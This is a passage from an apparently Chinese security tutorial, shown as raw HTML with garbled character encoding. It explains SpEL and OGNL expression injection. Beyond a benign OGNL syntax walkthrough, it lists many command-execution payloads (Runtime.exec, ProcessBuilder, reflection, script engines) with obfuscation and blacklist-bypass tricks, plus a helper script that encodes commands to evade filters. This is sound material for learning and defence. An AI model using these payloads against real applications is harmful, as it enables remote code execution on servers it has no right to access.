class="string">&quot;ec&quot;</span>,T(String[])).invoke(T(String).getClass().forName(<span class="string">&quot;java.l&quot;</span>+<span class="string">&quot;ang.Ru&quot;</span>+<span class="string">&quot;ntime&quot;</span>).getMethod(<span class="string">&quot;getRu&quot;</span>+<span class="string">&quot;ntime&quot;</span>).invoke(T(String).getClass().forName(<span class="string">&quot;java.l&quot;</span>+<span class="string">&quot;ang.Ru&quot;</span>+<span class="string">&quot;ntime&quot;</span>)),<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd&quot;</span>,<span class="string">&quot;/C&quot;</span>,<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// åŒä¸Šï¼Œéœ€è¦æœ‰ä¸Šä¸‹æ–‡ç¯å¢ƒ</span></span><br><span class="line">#<span class="built_in">this</span>.getClass().forName(<span class="string">&quot;java.l&quot;</span>+<span class="string">&quot;ang.Ru&quot;</span>+<span class="string">&quot;ntime&quot;</span>).getMethod(<span class="string">&quot;ex&quot;</span>+<span class="string">&quot;ec&quot;</span>,T(String[])).invoke(T(String).getClass().forName(<span class="string">&quot;java.l&quot;</span>+<span class="string">&quot;ang.Ru&quot;</span>+<span class="string">&quot;ntime&quot;</span>).getMethod(<span class="string">&quot;getRu&quot;</span>+<span class="string">&quot;ntime&quot;</span>).invoke(T(String).getClass().forName(<span class="string">&quot;java.l&quot;</span>+<span class="string">&quot;ang.Ru&quot;</span>+<span class="string">&quot;ntime&quot;</span>)),<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd&quot;</span>,<span class="string">&quot;/C&quot;</span>,<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// å½“æ‰§è¡Œçš„ç³»ç»Ÿå‘½ä»¤è¢«è¿‡æ»¤æˆ–è€…è¢«URLç¼–ç æ‰æ—¶ï¼Œå¯ä»¥é€šè¿‡Stringç±»åŠ¨æ€ç”Ÿæˆå­—ç¬¦ï¼ŒPart1</span></span><br><span class="line"><span class="comment">// byteæ•°ç»„å†…å®¹çš„ç”Ÿæˆåé¢æœ‰è„šæœ¬</span></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">java</span>.lang.ProcessBuilder(<span class="keyword">new</span> <span class="title class_">java</span>.lang.String(<span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;<span class="number">99</span>,<span class="number">97</span>,<span class="number">108</span>,<span class="number">99</span>&#125;)).start()</span><br><span class="line"></span><br><span class="line"><span class="comment">// å½“æ‰§è¡Œçš„ç³»ç»Ÿå‘½ä»¤è¢«è¿‡æ»¤æˆ–è€…è¢«URLç¼–ç æ‰æ—¶ï¼Œå¯ä»¥é€šè¿‡Stringç±»åŠ¨æ€ç”Ÿæˆå­—ç¬¦ï¼ŒPart2</span></span><br><span class="line"><span class="comment">// byteæ•°ç»„å†…å®¹çš„ç”Ÿæˆåé¢æœ‰è„šæœ¬</span></span><br><span class="line">T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(<span class="number">99</span>).concat(T(java.lang.Character).toString(<span class="number">97</span>)).concat(T(java.lang.Character).toString(<span class="number">108</span>)).concat(T(java.lang.Character).toString(<span class="number">99</span>)))</span><br><span class="line"></span><br><span class="line"><span class="comment">// JavaScriptå¼•æ“é€šç”¨PoC</span></span><br><span class="line">T(javax.script.ScriptEngineManager).newInstance().getEngineByName(<span class="string">&quot;nashorn&quot;</span>).eval(<span class="string">&quot;s=[3];s[0]=&#x27;cmd&#x27;;s[1]=&#x27;/C&#x27;;s[2]=&#x27;calc&#x27;;java.la&quot;</span>+<span class="string">&quot;ng.Run&quot;</span>+<span class="string">&quot;time.getRu&quot;</span>+<span class="string">&quot;ntime().ex&quot;</span>+<span class="string">&quot;ec(s);&quot;</span>)</span><br><span class="line"></span><br><span class="line">T(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager).newInstance().getEngineByName(<span class="string">&quot;JavaScript&quot;</span>).eval(<span class="string">&quot;xxx&quot;</span>),)</span><br><span class="line"></span><br><span class="line"><span class="comment">// JavaScriptå¼•æ“+åå°„è°ƒç”¨</span></span><br><span class="line">T(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager).newInstance().getEngineByName(<span class="string">&quot;JavaScript&quot;</span>).eval(T(String).getClass().forName(<span class="string">&quot;java.l&quot;</span>+<span class="string">&quot;ang.Ru&quot;</span>+<span class="string">&quot;ntime&quot;</span>).getMethod(<span class="string">&quot;ex&quot;</span>+<span class="string">&quot;ec&quot;</span>,T(String[])).invoke(T(String).getClass().forName(<span class="string">&quot;java.l&quot;</span>+<span class="string">&quot;ang.Ru&quot;</span>+<span class="string">&quot;ntime&quot;</span>).getMethod(<span class="string">&quot;getRu&quot;</span>+<span class="string">&quot;ntime&quot;</span>).invoke(T(String).getClass().forName(<span class="string">&quot;java.l&quot;</span>+<span class="string">&quot;ang.Ru&quot;</span>+<span class="string">&quot;ntime&quot;</span>)),<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd&quot;</span>,<span class="string">&quot;/C&quot;</span>,<span class="string">&quot;calc&quot;</span>&#125;)),)</span><br><span class="line"></span><br><span class="line"><span class="comment">// JavaScriptå¼•æ“+URLç¼–ç </span></span><br><span class="line"><span class="comment">// å…¶ä¸­URLç¼–ç å†…å®¹ä¸ºï¼š</span></span><br><span class="line"><span class="comment">// ä¸åŠ æœ€åçš„getInputStream()ä¹Ÿè¡Œï¼Œå› ä¸ºå¼¹è®¡ç®—å™¨ä¸éœ€è¦å›æ˜¾</span></span><br><span class="line">T(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager).newInstance().getEngineByName(<span class="string">&quot;JavaScript&quot;</span>).eval(T(java.net.URLDecoder).decode(<span class="string">&quot;%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%2e%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%22%63%61%6c%63%22%29%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29&quot;</span>)),)</span><br><span class="line"></span><br><span class="line"><span class="comment">// é»‘åå•è¿‡æ»¤&quot;.getClass(&quot;ï¼Œå¯åˆ©ç”¨æ•°ç»„çš„æ–¹å¼ç»•è¿‡ï¼Œè¿˜æœªæµ‹è¯•æˆåŠŸ</span></span><br><span class="line"><span class="string">&#x27;&#x27;</span>[<span class="string">&#x27;class&#x27;</span>].forName(<span class="string">&#x27;java.lang.Runtime&#x27;</span>).getDeclaredMethods()[<span class="number">15</span>].invoke(<span class="string">&#x27;&#x27;</span>[<span class="string">&#x27;class&#x27;</span>].forName(<span class="string">&#x27;java.lang.Runtime&#x27;</span>).getDeclaredMethods()[<span class="number">7</span>].invoke(<span class="literal">null</span>),<span class="string">&#x27;calc&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// JDK9æ–°å¢çš„shellï¼Œè¿˜æœªæµ‹è¯•</span></span><br><span class="line">T(SomeWhitelistedClassNotPartOfJDK).ClassLoader.loadClass(<span class="string">&quot;jdk.jshell.JShell&quot;</span>,<span class="literal">true</span>).Methods[<span class="number">6</span>].invoke(<span class="literal">null</span>,&#123;&#125;).eval(<span class="string">&#x27;whatever java code in one statement&#x27;</span>).toString()</span><br></pre></td></tr></table></figure><p>CreateAscii.pyï¼Œç”¨äºStringç±»åŠ¨æ€ç”Ÿæˆå­—ç¬¦çš„å­—ç¬¦ASCIIç è½¬æ¢ç”Ÿæˆï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">message = <span class="built_in">input</span>(<span class="string">&#x27;Enter message to encode:&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Decoded string (in ASCII):\n&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;T(java.lang.Character).toString(%s)&#x27;</span> % <span class="built_in">ord</span>(message[<span class="number">0</span>]), end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> ch <span class="keyword">in</span> message[<span class="number">1</span>:]:</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&#x27;.concat(T(java.lang.Character).toString(%s))&#x27;</span> % <span class="built_in">ord</span>(ch), end=<span class="string">&quot;&quot;</span>), </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;new java.lang.String(new byte[]&#123;&#x27;</span>, end=<span class="string">&quot;&quot;</span>),</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">ord</span>(message[<span class="number">0</span>]), end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> ch <span class="keyword">in</span> message[<span class="number">1</span>:]:</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&#x27;,%s&#x27;</span> % <span class="built_in">ord</span>(ch), end=<span class="string">&quot;&quot;</span>), </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;)&#125;&#x27;</span>)</span><br></pre></td></tr></table></figure><p>ä¸€äº›bypassæŠ€å·§ï¼š</p><p>å‚è€ƒï¼š<a href="https://boogipop.com/2023/08/06/SPEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93%E5%8F%8A%E5%9B%9E%E6%98%BE%E6%8A%80%E6%9C%AF/">https://boogipop.com/2023/08/06/SPEL</a></p><h2 id="OGNLæ˜¯ä»€ä¹ˆï¼Ÿ"><a href="#OGNLæ˜¯ä»€ä¹ˆï¼Ÿ" class="headerlink" title="OGNLæ˜¯ä»€ä¹ˆï¼Ÿ"></a>OGNLæ˜¯ä»€ä¹ˆï¼Ÿ</h2><p>å…ˆæ¥çœ‹ä¸€ä¸ªä¾‹å­:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Class SchoolMaster&#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;wanghua&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Class School</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;tsinghua&quot;</span>;</span><br><span class="line">    SchoolMaster schoolMaster;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Class Student</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;xiaoming&quot;</span>;</span><br><span class="line">    School school;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åˆ›å»ºå®ä¾‹å­¦æ ¡school &#x3D; new School()ã€å­¦ç”Ÿstudent &#x3D; new Student()å’Œæ ¡é•¿schoolMaster &#x3D; new SchoolMaster()ï¼Œå°†å­¦æ ¡æ ¡é•¿æŒ‡å®šä¸ºschoolMasterå®ä¾‹-school.schoolMaster &#x3D; schoolMasterï¼Œå­¦ç”Ÿçš„å­¦æ ¡æŒ‡å®šä¸ºschoolå®ä¾‹-student.school &#x3D; schoolï¼Œé‚£ä¹ˆä¸‰è€…å°±è¿æ¥èµ·æ¥äº†å½¢æˆäº†ä¸€ä¸ªå¯¹è±¡å›¾ï¼Œå¯¹è±¡å›¾åŸºæœ¬å¯ä»¥ç†è§£ä¸ºå¯¹è±¡ä¹‹é—´çš„ä¾èµ–å›¾ã€‚é€šè¿‡å¯¹è±¡å›¾æˆ‘ä»¬å¯ä»¥è·å–åˆ°å¯¹è±¡çš„å±æ€§ç”šè‡³å¯¹è±¡çš„æ–¹æ³•ã€‚</p><p>é‚£ä¹ˆOGNLå°±æ˜¯å®ç°å¯¹è±¡å›¾å¯¼èˆªè¯­è¨€ï¼Œå…¨ç§°Object-Graph Navigation Languageã€‚é€šè¿‡å®ƒæˆ‘ä»¬å¯ä»¥å­˜å– Javaå¯¹è±¡çš„ä»»æ„å±æ€§ã€è°ƒç”¨ Java å¯¹è±¡çš„æ–¹æ³•ä»¥åŠå®ç°ç±»å‹è½¬æ¢ç­‰ã€‚</p><h3 id="OGNLä¸‰å…ƒç´ "><a href="#OGNLä¸‰å…ƒç´ " class="headerlink" title="OGNLä¸‰å…ƒç´ "></a>OGNLä¸‰å…ƒç´ </h3><p>OGNLåŸºæœ¬ä½¿ç”¨æ–¹æ³•ç¤ºä¾‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// åˆ›å»ºStudentå¯¹è±¡</span></span><br><span class="line"><span class="type">School</span> <span class="variable">school</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">School</span>();</span><br><span class="line">school.setName(<span class="string">&quot;tsinghua&quot;</span>);</span><br><span class="line">school.setSchoolMaster(<span class="keyword">new</span> <span class="title class_">SchoolMaster</span>(<span class="string">&quot;wanghua&quot;</span>));</span><br><span class="line"><span class="type">Student</span> <span class="variable">student1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>();</span><br><span class="line">student1.setName(<span class="string">&quot;xiaoming&quot;</span>);</span><br><span class="line">student1.setSchool(school);</span><br><span class="line"><span class="type">Student</span> <span class="variable">student2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>();</span><br><span class="line">student2.setName(<span class="string">&quot;zhangsan&quot;</span>);</span><br><span class="line">student2.setSchool(school);</span><br><span class="line"></span><br><span class="line"><span class="comment">// åˆ›å»ºä¸Šä¸‹æ–‡ç¯å¢ƒ</span></span><br><span class="line"><span class="type">OgnlContext</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">OgnlContext</span>();</span><br><span class="line"><span class="comment">// è®¾ç½®è·Ÿå¯¹è±¡root</span></span><br><span class="line">context.setRoot(student1);</span><br><span class="line">context.put(<span class="string">&quot;student2&quot;</span>, student2);</span><br><span class="line"><span class="comment">// è·å–ognlçš„rootç›¸å…³å€¼</span></span><br><span class="line"><span class="type">Object</span> <span class="variable">name1</span> <span class="operator">=</span> Ognl.getValue(<span class="string">&quot;name&quot;</span>, context, context.getRoot());</span><br><span class="line"><span class="type">Object</span> <span class="variable">school1</span> <span class="operator">=</span> Ognl.getValue(<span class="string">&quot;school.name&quot;</span>, context, context.getRoot());</span><br><span class="line"><span class="type">Object</span> <span class="variable">schoolMaster1</span> <span class="operator">=</span> Ognl.getValue(<span class="string">&quot;school.schoolMaster.name&quot;</span>, context, context.getRoot());</span><br><span class="line">System.out.println(name1 + <span class="string">&quot;:å­¦æ ¡-&quot;</span> + school1 + <span class="string">&quot;,æ ¡é•¿-&quot;</span>+schoolMaster1);</span><br><span class="line"><span class="comment">// è·å–ognlérootç›¸å…³å€¼</span></span><br><span class="line"><span class="type">Object</span> <span class="variable">name2</span> <span class="operator">=</span> Ognl.getValue(<span class="string">&quot;#student2.name&quot;</span>, context, context.getRoot());</span><br><span class="line"><span class="type">Object</span> <span class="variable">school2</span> <span class="operator">=</span> Ognl.getValue(<span class="string">&quot;#student2.school.name&quot;</span>, context, context.getRoot());</span><br><span class="line"><span class="type">Object</span> <span class="variable">schoolMaster2</span> <span class="operator">=</span> Ognl.getValue(<span class="string">&quot;#student2.school.schoolMaster.name&quot;</span>, context, context.getRoot());</span><br><span class="line">System.out.println(name2 + <span class="string">&quot;:å­¦æ ¡-&quot;</span> + school2 + <span class="string">&quot;,æ ¡é•¿-&quot;</span>+schoolMaster2);</span><br></pre></td></tr></table></figure><p>è¾“å‡ºç»“æœï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xiaoming:å­¦æ ¡-tsinghua,æ ¡é•¿-wanghua</span><br><span class="line">zhangsan:å­¦æ ¡-tsinghua,æ ¡é•¿-wanghua</span><br></pre></td></tr></table></figure><p>ä¸éš¾çœ‹å‡ºï¼ŒOGNL getValueéœ€è¦ä¸‰å…ƒç´ ï¼šexpressionè¡¨è¾¾å¼ã€contextä¸Šä¸‹æ–‡åŠrootå¯¹è±¡ã€‚é‚£ä¹ˆä»€ä¹ˆæ˜¯ä¸‰å…ƒç´ ï¼š</p><p>expressionè¡¨è¾¾å¼ï¼šè¡¨è¾¾å¼æ˜¯æ•´ä¸ªOGNLçš„æ ¸å¿ƒï¼Œé€šè¿‡è¡¨è¾¾å¼æ¥å‘Šè¯‰OGNLéœ€è¦æ‰§è¡Œä»€ä¹ˆæ“ä½œï¼›<br>rootæ ¹å¯¹è±¡ï¼šOGNLçš„Rootå¯¹è±¡å¯ä»¥ç†è§£ä¸ºOGNLçš„æ“ä½œå¯¹è±¡ã€‚å½“OGNLé€šè¿‡è¡¨è¾¾å¼è§„å®šäº†â€œå¹²ä»€ä¹ˆâ€ä»¥åï¼Œè¿˜éœ€è¦æŒ‡å®šå¯¹è°è¿›è¡Œæ“ä½œï¼›<br>contextä¸Šä¸‹æ–‡å¯¹è±¡ï¼šcontextä»¥MAPçš„ç»“æ„ã€åˆ©ç”¨é”®å€¼å¯¹å…³ç³»æ¥æè¿°å¯¹è±¡ä¸­çš„å±æ€§ä»¥åŠå€¼ï¼Œç§°ä¹‹ä¸ºOgnlContextï¼Œå¯ä»¥ç†è§£ä¸ºå¯¹è±¡è¿è¡Œçš„ä¸Šä¸‹æ–‡ç¯å¢ƒï¼Œå…¶å®å°±æ˜¯è§„å®šOGNLçš„æ“ä½œåœ¨å“ªé‡Œã€‚</p><p>åœ¨ä¸Šé¢ç¤ºä¾‹ä¸­ï¼Œæ ¹å¯¹è±¡æ˜¯student1å®ä¾‹ï¼Œcontextä¸­è®¾ç½®äº†æ ¹å¯¹è±¡å’Œéæ ¹å¯¹è±¡student2ï¼Œè¡¨è¾¾å¼æœ‰nameã€school.nameã€school.schoolMaster.nameå’Œstudent2.nameã€#student2.school.nameã€student2.school.schoolMaster.nameï¼Œå‰ä¸‰ä¸ªæ˜¯é€šè¿‡è¡¨è¾¾å¼è·å–rootä¹Ÿå°±æ˜¯student1å¯¹è±¡çš„ç›¸å…³å±æ€§ï¼Œåä¸‰ä¸ªæ˜¯é€šè¿‡è¡¨è¾¾å¼è·å–å®¹å™¨å˜é‡student2å¯¹è±¡çš„ç›¸å…³å±æ€§ã€‚</p><h3 id="OGNLè¡¨è¾¾å¼è¯­æ³•"><a href="#OGNLè¡¨è¾¾å¼è¯­æ³•" class="headerlink" title="OGNLè¡¨è¾¾å¼è¯­æ³•"></a>OGNLè¡¨è¾¾å¼è¯­æ³•</h3><h4 id="ç¬¦å·çš„ä½¿ç”¨ï¼š"><a href="#ç¬¦å·çš„ä½¿ç”¨ï¼š" class="headerlink" title="ç¬¦å·çš„ä½¿ç”¨ï¼š"></a>ç¬¦å·çš„ä½¿ç”¨ï¼š</h4><p>åœ¨ä¸Šä¸€éƒ¨åˆ†æˆ‘ä»¬å·²ç»æ¥è§¦äº†.å’Œ#ç¬¦å·åœ¨è¡¨è¾¾å¼ä¸­çš„ä½¿ç”¨ï¼Œé€šè¿‡.å¯ä»¥è·å–å¯¹è±¡å±æ€§ï¼Œ#å¯ä»¥è·å–érootçš„Studentå¯¹è±¡ã€‚</p><p>OGNLè¡¨è¾¾å¼æ”¯æŒJavaåŸºæœ¬è¿ç®—ï¼Œæ‰€ä»¥è¿ç®—ç¬¦+ã€-ã€*ã€&#x2F;ã€%ç­‰åœ¨OGNLéƒ½æ˜¯æ”¯æŒçš„ï¼Œå¦å¤–è¿˜æ”¯æŒinã€eqã€gtç­‰ã€‚</p><p>é™¤äº†åŸºæœ¬è¿ç®—ç¬¦ï¼Œ.ã€@ã€#åœ¨OGNLä¸­éƒ½æœ‰ç‰¹æ®Šå«ä¹‰ã€‚</p><p>1ã€é€šè¿‡.è·å–å¯¹è±¡çš„å±æ€§æˆ–æ–¹æ³•ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">student</span><br><span class="line">student.name</span><br><span class="line">student.school</span><br><span class="line">student.school.name</span><br><span class="line">student.takingClasses(<span class="string">&quot;è‹±è¯­&quot;</span>)</span><br></pre></td></tr></table></figure><p>2ã€ä¸‰ç§ç±»å‹å¯¹è±¡çš„è·å–ï¼š</p><p>é™æ€å¯¹è±¡ã€é™æ€æ–¹æ³•å’Œé™æ€å˜é‡ï¼š@</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@java</span>.lang.System<span class="meta">@getProperty(&quot;user.dir&quot;)</span></span><br><span class="line"><span class="meta">@java</span>.lang.Math<span class="meta">@abs(-111)</span></span><br></pre></td></tr></table></figure><p>éåŸç”Ÿç±»å‹å¯¹è±¡ï¼š#</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#student.name</span><br><span class="line">#student.takingClasses(<span class="string">&quot;è‹±è¯­&quot;</span>)</span><br></pre></td></tr></table></figure><p>ç®€å•å¯¹è±¡ï¼šç›´æ¥è·å–</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;string&quot;</span>.lenth</span><br><span class="line"><span class="number">5</span></span><br><span class="line"><span class="literal">true</span></span><br></pre></td></tr></table></figure><p>3ã€%ç¬¦å·çš„ç”¨é€”æ˜¯åœ¨æ ‡å¿—çš„å±æ€§ä¸ºå­—ç¬¦ä¸²ç±»å‹æ—¶ï¼Œå‘Šè¯‰æ‰§è¡Œç¯å¢ƒ%{}é‡Œçš„æ˜¯OGNLè¡¨è¾¾å¼å¹¶è®¡ç®—è¡¨è¾¾å¼çš„å€¼ã€‚</p><p>4ã€$åœ¨é…ç½®æ–‡ä»¶ä¸­å¼•ç”¨OGNLè¡¨è¾¾å¼ã€‚</p><h3 id="é›†åˆè¡¨è¾¾å¼ï¼š"><a href="#é›†åˆè¡¨è¾¾å¼ï¼š" class="headerlink" title="é›†åˆè¡¨è¾¾å¼ï¼š"></a>é›†åˆè¡¨è¾¾å¼ï¼š</h3><p>newåˆ›å»ºå®ä¾‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">java</span>.lang.String(<span class="string">&quot;testnew&quot;</span>)</span><br></pre></td></tr></table></figure><p>{}å’Œ[]çš„ç”¨æ³•ï¼š</p><p>åœ¨OGNLä¸­ï¼Œå¯ä»¥ç”¨{}æˆ–è€…å®ƒçš„ç»„åˆæ¥åˆ›å»ºåˆ—è¡¨ã€æ•°ç»„å’Œmapï¼Œ[]å¯ä»¥è·å–ä¸‹æ ‡å…ƒç´ ã€‚</p><p>åˆ›å»ºlistï¼š{value1,value2â€¦}</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="number">1</span>,<span class="number">3</span>,<span class="number">5</span>&#125;[<span class="number">1</span>]</span><br></pre></td></tr></table></figure><p>åˆ›å»ºæ•°ç»„ï¼šnew type[]{value1,value2â€¦}</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">1</span>,<span class="number">3</span>,<span class="number">5</span>&#125;[<span class="number">0</span>]</span><br></pre></td></tr></table></figure><p>åˆ›å»ºmapï¼š#{key:value,key1:value1â€¦}</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;xiaoming&quot;</span>,<span class="string">&quot;school&quot;</span>:<span class="string">&quot;tsinghua&quot;</span>&#125;[<span class="string">&quot;school&quot;</span>]</span><br></pre></td></tr></table></figure><p>é™¤äº†ä¸€äº›ç¬¦å·å’Œé›†åˆï¼Œè¿˜æ”¯æŒProjectionæŠ•å½±å’ŒSelectioné€‰æ‹©ç­‰ï¼Œå…·ä½“å¯å‚è€ƒå®˜æ–¹æ–‡æ¡£ï¼š<a href="https://commons.apache.org/proper/commons-ognl/language-guide.html">https://commons.apache.org/proper/commons-ognl/language-guide.html</a> é™„å½•Operatorséƒ¨åˆ†ã€‚</p><h3 id="å‘½ä»¤æ‰§è¡Œè°ƒè¯•åˆ†æ"><a href="#å‘½ä»¤æ‰§è¡Œè°ƒè¯•åˆ†æ" class="headerlink" title="å‘½ä»¤æ‰§è¡Œè°ƒè¯•åˆ†æ"></a>å‘½ä»¤æ‰§è¡Œè°ƒè¯•åˆ†æ</h3><p>é€šè¿‡ä¸Šé¢è¡¨è¾¾å¼çš„å­¦ä¹ æˆ‘ä»¬å¾ˆå®¹æ˜“èƒ½å¤Ÿå†™å‡ºJavaæ‰§è¡Œå‘½ä»¤çš„è¡¨è¾¾å¼ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">//ä½¿ç”¨runtimeæ‰§è¡Œç³»ç»Ÿå‘½ä»¤</span></span><br><span class="line"><span class="meta">@java</span>.lang.Runtime<span class="meta">@getRuntime()</span>.exec(<span class="string">&quot;calc&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//ä½¿ç”¨processbuilderæ‰§è¡Œç³»ç»Ÿå‘½ä»¤</span></span><br><span class="line">(<span class="keyword">new</span> <span class="title class_">java</span>.lang.ProcessBuilder(<span class="keyword">new</span> <span class="title class_">java</span>.lang.String[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)).start()</span><br><span class="line"></span><br><span class="line"><span class="comment">//ä½¿ç”¨åå°„è°ƒç”¨runtimeæ‰§è¡Œç³»ç»Ÿå‘½ä»¤</span></span><br><span class="line">$&#123;(#runtimeclass=#<span class="built_in">this</span>.getClass().forName(<span class="string">&quot;java.lang.Runtime&quot;</span>)).(#getruntimemethod=#runtimeclass.getDeclaredMethods([<span class="number">7</span>]).(#rtobj=#getruntimemethod.invoke(<span class="literal">null</span>,<span class="literal">null</span>)).(#execmethod=#runtimeclass.getDeclaredMethods([<span class="number">14</span>]).(#execmethod.invoke(#rtobj,<span class="string">&quot;cmd&quot;</span>))&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//ä½¿ç”¨Jshellæ‰§è¡Œjavaä»£ç (jdk9åŠä»¥å)</span></span><br><span class="line"><span class="meta">@jdk</span>.jshell.Jshell<span class="meta">@create()</span>.eval(<span class="string">&#x27;code&#x27;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å…³é”®å­—ç»•è¿‡</p><p>å‡å¦‚é¢˜ç›®ä¸­å¯¹ç”¨æˆ·çš„è¾“å…¥è¿›è¡Œäº†å…³é”®å­—çš„é»‘åå•(ä»¥newä¸ºä¾‹)ï¼Œé‚£ä¹ˆå®é™…ä¸Šæˆ‘ä»¬å¯ä»¥ä½¿ç”¨unicodeå­—ç¬¦è¿›è¡Œç»•è¿‡:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="string">&quot;(\u006eew java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;</span>calc<span class="string">&quot;&#125;)).start()&quot;</span>;</span><br><span class="line">Ognl.getValue(str, <span 